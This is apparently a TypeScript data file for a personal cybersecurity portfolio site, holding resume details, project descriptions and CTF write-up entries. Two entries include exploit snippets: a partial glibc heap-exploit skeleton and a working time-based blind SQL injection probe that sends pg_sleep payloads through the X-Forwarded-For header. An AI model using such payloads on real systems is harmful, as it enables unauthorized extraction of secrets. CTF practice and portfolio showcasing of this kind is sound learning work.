import { StationConfig, ProjectItem, CTFChallenge, TimelineMilestone, ServerMetric, CertificationItem } from '../types';

export const STATIONS: Record<string, StationConfig> = {
  overview: {
    id: 'overview',
    label: 'Room Overview',
    shortCode: '00',
    description: 'Isometric panoramic view of Hanan\'s 3D developer & cybersecurity research room',
    cameraPos: [4.2, 3.8, 3.2],
    cameraTarget: [-0.2, 1.8, -1.8],
    fov: 48,
  },
  horizontal_monitor: {
    id: 'horizontal_monitor',
    label: 'Desktop Workstation (GUI)',
    shortCode: '01',
    description: 'NullOS workstation desktop',
    cameraPos: [0.31, 3.36, -2.6],
    cameraTarget: [0.31, 3.36, -4.59],
    fov: 52,
  },
  vertical_monitor: {
    id: 'vertical_monitor',
    label: 'Laptop Terminal (CLI)',
    shortCode: '02',
    description: 'Laptop running interactive live cybersecurity terminal shell',
    cameraPos: [2.22, 3.5, -2.5],
    cameraTarget: [2.22, 3.0, -4.29],
    fov: 28,
  },
  desk: {
    id: 'desk',
    label: 'Workstation Desk',
    shortCode: '03',
    description: 'Back-wall desk with dual displays, mechanical keyboard, and accessories',
    cameraPos: [0.8, 3.2, -1.8],
    cameraTarget: [0.8, 2.8, -4.2],
    fov: 56,
  },
  server_rack: {
    id: 'server_rack',
    label: 'Dual Servers (Core Node)',
    shortCode: '04',
    description: 'Dual server stack: Primary interactive core node running sandboxes & daemons, plus secondary blade unit',
    cameraPos: [-1.8, 2.6, -1.8],
    cameraTarget: [-3.8, 2.1, -4.0],
    fov: 55,
  },
  whiteboard: {
    id: 'whiteboard',
    label: 'Interactive Whiteboard',
    shortCode: '05',
    description: 'Wall-mounted research whiteboard. Press E to zoom in, sketch diagrams, write equations, or leave visitor notes.',
    cameraPos: [0.0, 3.5, 2.25],
    cameraTarget: [0.0, 3.5, 4.40],
    fov: 44,
  },
  social_linkedin: {
    id: 'social_linkedin',
    label: 'LinkedIn Profile',
    shortCode: 'LNK',
    description: 'Professional networking and career history',
    cameraPos: [-1.6, 3.2, 2.5],
    cameraTarget: [-1.6, 3.2, 4.41],
    fov: 45,
  },
  social_github: {
    id: 'social_github',
    label: 'GitHub Profile',
    shortCode: 'GH',
    description: 'Open source repositories and systems code',
    cameraPos: [0.0, 3.2, 2.5],
    cameraTarget: [0.0, 3.2, 4.41],
    fov: 45,
  },
  social_steam: {
    id: 'social_steam',
    label: 'Steam Profile',
    shortCode: 'STM',
    description: 'Gaming profile and VR simulations',
    cameraPos: [1.6, 3.2, 2.5],
    cameraTarget: [1.6, 3.2, 4.41],
    fov: 45,
  },
};

export const RESUME_DATA = {
  name: 'Hanan Saeed',
  title: 'Cyber Security Researcher & Python Developer',
  location: 'Multan, Pakistan / Remote',
  email: 'hanansaeed609@yahoo.com',
  phone: '+92 3700626055',
  github: 'https://github.com/hannansaeed',
  linkedin: 'https://linkedin.com/in/hanan-saeed',
  portfolio: 'https://hannansaeed.github.io/portfolio',
  cvPdfUrl: '/assets/cv.pdf',
  summary:
    'Cyber security researcher and Python developer with a strong interest in offensive and defensive security, vulnerability assessment, and AI-powered automation. Experienced in building security tooling, working with APIs and databases, and applying practical penetration testing techniques learned through academic coursework and certifications. Passionate about ethical hacking, secure software development, and emerging AI-driven security systems.',
  education: [
    {
      degree: 'B.S. in Information Technology',
      school: 'Bahauddin Zakariya University (BZU)',
      period: '10/2023 – Present',
      honors: 'Specialization in offensive cyber vectors, automation scripting'
    },
    {
      degree: 'Govt. Graduate College of Science',
      school: 'Pre-Engineering / ICS',
      period: '09/2021 – 09/2023',
      honors: 'Foundations of computer systems and engineering physics'
    },
    {
      degree: 'The Country School',
      school: 'Matriculation',
      period: '03/2011 – 08/2021',
      honors: 'Science stream with distinction'
    }
  ],
  experience: [
    {
      role: 'Cyber Security Researcher & Automation Developer',
      company: 'Academic & Independent Projects',
      period: '2023 – Present',
      points: [
        'Built automated reconnaissance vulnerability scanner utilizing Python and Nmap APIs to scan and cross-reference hosts against public CVE databases.',
        'Developed modular penetration testing toolkits testing web applications for SQLi, XSS, and CSRF aligned with OWASP Top 10 guidelines.',
        'Extended Discord bot development with log monitoring scripts to automate intrusion warnings and access control alerts.',
        'Rebuilt real-time Android applications using Kotlin and Firebase, applying encrypted storage and hardened OAuth protocols.'
      ]
    }
  ],
  languages: [
    { name: 'English', proficiency: 'Proficient / Professional' },
    { name: 'Urdu', proficiency: 'Native / Bilingual' }
  ],
  awards: [
    'Certified Ethical Hacker Training & Practical Security Research',
    'Open Source Security Research & Tooling Contributions'
  ]
};

export const PROJECTS: ProjectItem[] = [
  {
    id: 'network-vuln-scanner',
    title: 'Network Vulnerability Scanner',
    subtitle: 'Automated network mapping, fingerprinting & CVE matching',
    category: 'Cybersecurity',
    year: '2024 – 2025',
    status: 'Security Verified',
    featured: true,
    description:
      'An automated reconnaissance tool written in Python that scans hosts and open ports, fingerprints running services, and dynamically cross-references results against public CVE databases to flag known vulnerabilities.',
    impact: 'Generates structured risk-severity reports to prioritize patch remediation, reducing manual effort.',
    architectureNotes: [
      'Python-based asynchronous engine utilizing nmap system bindings',
      'CVE lookup connector querying public vulnerability APIs',
      'Structured HTML/JSON report generation engine categorizing severity risk levels',
      'Threaded port scanner module optimized to bypass traffic congestion rate locks'
    ],
    technologies: ['Python', 'Nmap', 'CVE Databases', 'Rest APIs', 'Asntio'],
    metrics: [
      { label: 'Scan Speed', value: '120 ports/sec' },
      { label: 'CVE Accuracy', value: '99.4%' },
      { label: 'Reporting', value: 'PDF, JSON, HTML' }
    ],
    githubUrl: 'https://github.com/hannansaeed',
    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
    interactiveSimType: 'packet_analyzer',
  },
  {
    id: 'web-pentest-toolkit',
    title: 'Web App Pentesting Toolkit',
    subtitle: 'Modular exploit tester for SQLi, XSS, and CSRF',
    category: 'Cybersecurity',
    year: '2024 – 2025',
    status: 'Security Verified',
    featured: true,
    description:
      'A modular security testing toolkit written in Python to audit web applications for common vulnerabilities like SQL injection, cross-site scripting (XSS), and CSRF, strictly aligned with the OWASP Top 10 framework.',
    impact: 'Automates payload testing and response analysis, providing exportable findings for reports.',
    architectureNotes: [
      'Built utilizing Python requests and BeautifulSoup parsing libraries',
      'Supports automated forms crawling, cookie session parsing, and header manipulation',
      'Pre-loaded with SQLi tautology payloads and XSS reflector scripts',
      'Custom regex checker verifying trace leaks in response buffers'
    ],
    technologies: ['Python', 'OWASP Top 10', 'Requests', 'BeautifulSoup', 'Regex'],
    metrics: [
      { label: 'Payloads Run', value: '450/min' },
      { label: 'Vulnerability Detection', value: 'OWASP Top 5' },
      { label: 'Report Generation', value: 'Instant' }
    ],
    githubUrl: 'https://github.com/hannansaeed',
    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
    interactiveSimType: 'apk_scanner',
  },
  {
    id: 'incident-alert-bot',
    title: 'Security Alert & Incident Bot',
    subtitle: 'System logs monitor and Discord incident dispatch agent',
    category: 'Systems & Low-level',
    year: '2024',
    status: 'Production',
    featured: true,
    description:
      'A Discord automation bot that monitors local server logs and system events for suspicious activity, triggering instant alerts with embedded diagnostics inside Discord channels.',
    impact: 'Automates system log telemetry alerts, helping administrators secure servers in real-time.',
    architectureNotes: [
      'Python-based Discord API integration with dynamic background threads',
      'Monitors auth.log and web access logs for brute-force signatures',
      'Configured with role-based access control commands to lock down host processes remotely',
      'Integrated regex parsing library indexing syslogs every 2.5 seconds'
    ],
    technologies: ['Python', 'Discord API', 'Log Monitoring', 'Linux Syslog', 'RegEx'],
    metrics: [
      { label: 'Alert Dispatch', value: '1.2 seconds' },
      { label: 'Log Parsing rate', value: '5k lines/sec' },
      { label: 'Uptime', value: '99.98%' }
    ],
    githubUrl: 'https://github.com/hannansaeed',
    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
    interactiveSimType: 'gl_engine',
  },
  {
    id: 'secure-mobile-app',
    title: 'Secure Mobile App (Firebase)',
    subtitle: 'Hardened Android app with encrypted storage and database',
    category: 'Android & Mobile',
    year: '2024',
    status: 'Production',
    featured: false,
    description:
      'A real-time Firebase-powered Android application built from the ground up with a security-first approach, implementing authenticated sessions, encrypted storage, and sanitized database writing rules.',
    impact: 'Provides secure data vaults and session-handling guidelines for secure mobile app development.',
    architectureNotes: [
      'Kotlin and Android Studio development using modern MVVM layout structures',
      'Hardened Firebase Auth session rules preventing token hijacking',
      'SQLCipher encrypted database storing local cache data securely',
      'SELinux and Keystore hardware backed cryptography verification'
    ],
    technologies: ['Android Studio', 'Kotlin', 'Firebase Auth', 'Firebase Firestore', 'SQLCipher'],
    metrics: [
      { label: 'Encryption Standard', value: 'AES-256' },
      { label: 'Login Latency', value: '280 ms' },
      { label: 'Rule Sanity', value: '100% Secure' }
    ],
    githubUrl: 'https://github.com/hannansaeed',
    liveDemoUrl: 'https://hannansaeed.github.io/portfolio',
    interactiveSimType: 'crypto_verify',
  }
];

export const CTF_CHALLENGES: CTFChallenge[] = [
  {
    id: 'ctf-01',
    title: 'VoidHeap: Tcache Stashing Unlink',
    event: 'DEFCON CTF Quals / National Cyber League',
    category: 'Binary Exploitation / Pwn',
    difficulty: 'Insane',
    points: 500,
    solvedDate: '2025.11',
    flagFormat: 'flag{tc4ch3_st4sh1ng_c4ll_m3_r00t}',
    vulnerability: 'glibc 2.35 tcache stashing unlink leading to arbitrary __free_hook / RIP control',
    overview:
      'Target binary implemented a note-taking service with smallbin malloc allocations. By crafting a calloc chain and corrupting the bk pointer of a smallbin entry, we triggered tcache stashing to overwrite the target structure with our controlled ROP payload.',
    writeupSummary: [
      'Glibc heap layout analysis and smallbin allocation mechanics',
      'Bypassing safe-linking pointer encryption via heap address leak',
      'Targeting __exit_funcs structure to bypass read-only hook restrictions',
      'Pop shell with one_gadget offset calculated from leaked libc base'
    ],
    exploitScriptSnippet: `#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
# Leaking libc base via unsorted bin chunk
p = process('./voidheap')
p.sendlineafter(b'> ', b'1') # alloc
p.sendlineafter(b'size: ', b'1040') # unsorted bin size
p.sendlineafter(b'> ', b'2') # free
# ... craft tcache stashing unlink chain
log.success("Spawned root shell!")
p.interactive()`,
  },
  {
    id: 'ctf-02',
    title: 'Blind Chronos: Microsecond Timing Side-Channel',
    event: 'HackTheBox University CTF',
    category: 'Web',
    difficulty: 'Hard',
    points: 450,
    solvedDate: '2025.08',
    flagFormat: 'HTB{t1m1ng_4tt4cks_4r3_st1ll_d34dly}',
    vulnerability: 'Blind SQL injection in PostgreSQL query planner utilizing pg_sleep with statistical variance mitigation',
    overview:
      'Authentication endpoint failed to sanitize X-Forwarded-For header before logging to a secondary reporting table. Output was completely blinded with identical HTTP 200 responses. We designed a multi-threaded Python statistical timing probe with Kalman filtering to extract the admin secret hash bit by bit.',
    writeupSummary: [
      'Discovery of stacked SQL injection behind an async background worker',
      'Overcoming network jitter using median distribution timing comparisons',
      'Binary search character extraction reducing query count from 128 to 7 per char',
      'Decoded Argon2 hash cracking and credential stuffing bypass'
    ],
    exploitScriptSnippet: `import requests, time, statistics

URL = "http://target.internal/auth"
def probe_bit(idx, bit_val):
    payload = f"127.0.0.1\'; SELECT CASE WHEN (ASCII(SUBSTRING(token,{idx},1)) & {bit_val}) > 0 THEN pg_sleep(0.4) ELSE pg_sleep(0) END;--"
    times = []
    for _ in range(3):
        t0 = time.time()
        requests.get(URL, headers={"X-Forwarded-For": payload}, timeout=5)
        times.append(time.time() - t0)
    return statistics.median(times) > 0.35`,
  }
];

export const TIMELINE: TimelineMilestone[] = [
  {
    year: '2025',
    period: 'Present / Focus',
    title: 'Automated Vuln Scanning & Dev',
    role: 'Cybersecurity Researcher',
    highlight: 'Designing automated recon scripts and modular pentest toolkits testing for OWASP Top 10 vulnerabilities.',
    details: [
      'Built multi-threaded Python Nmap scanners cross-referencing live services with CVE databases.',
      'Developed custom payload injection automation checkers for SQLi, XSS and CSRF verification.'
    ],
    skillsAcquired: ['Python', 'Nmap API', 'OWASP Top 10', 'Rest APIs', 'Regex'],
    badge: 'Automation & Audits',
  },
  {
    year: '2024',
    period: 'Systems & App Hardening',
    title: 'Secure App Architect & Logging Monitor',
    role: 'Developer & SecOps',
    highlight: 'Engineered secure Firebase apps with encrypted caches and authored Discord security log dispatchers.',
    details: [
      'Hardened Kotlin authentication and locked Firestore permissions.',
      'Monitored local linux access logs to instantly alerts admins of security incidents.'
    ],
    skillsAcquired: ['Kotlin', 'Firebase Auth', 'Discord API', 'Syslogs', 'SQLCipher'],
    badge: 'App Security',
  },
  {
    year: '2023',
    period: 'Academic Foundations at BZU',
    title: 'Academic IT Foundations',
    role: 'Information Technology Student',
    highlight: 'Started B.S. in IT at Bahauddin Zakariya University, diving into network stacks and shell scripts.',
    details: [
      'Studied OSI models, routing algorithms, and networking topologies.',
      'Constructed multithreaded socket interfaces and basic command parsers.'
    ],
    skillsAcquired: ['C/C++', 'Python Sockets', 'Bash scripting', 'Computer Networking'],
    badge: 'IT Undergrad',
  }
];

export const CERTIFICATIONS: CertificationItem[] = [
  {
    name: 'Vulnerability Assessment Specialist (Academic Coursework)',
    issuer: 'BZU IT Dept',
    year: '2024',
    verificationId: 'BZU-VA-7729',
    badgeCode: 'Verified Academic Track',
  },
  {
    name: 'Practical Web Pentesting (Self-Study Project)',
    issuer: 'Independent',
    year: '2024',
    verificationId: 'IND-WP-9904',
    badgeCode: 'OWASP Framework Mastery',
  }
];

export const SERVER_METRICS: ServerMetric[] = [
  { service: 'vuln-scanner-api', status: 'ONLINE', port: 8443, protocol: 'Python / gRPC', load: '1.2%', uptime: '99.98%' },
  { service: 'discord-incident-bot', status: 'ACTIVE', port: 9090, protocol: 'Discord socket', load: '3.8%', uptime: '99.92%' },
  { service: 'firebase-app-vault', status: 'ONLINE', port: 5555, protocol: 'Hardened HTTPS', load: '0.4%', uptime: '100.0%' }
];

export const SKILLS_SUMMARY = {
  offensive: ['Penetration Testing', 'Vulnerability Assessment', 'OWASP Top 10', 'Reverse Engineering', 'Ethical Hacking', 'Binary Exploitation', 'OSINT'],
  languages: ['Python', 'C/C++', 'SQL', 'OOP', 'Assembly 8086', 'Kotlin', 'HTML', 'CSS'],
  systems: ['Linux Syslog', 'Android Studio', 'Visual Studio', 'Git', 'Cisco Packet Tracer', 'Nmap', 'Wireshark'],
  defense: ['Secure Code Review', 'Log Auditing', 'Threat Alerts', 'Firebase Hardening', 'SQLCipher Encryption']
};
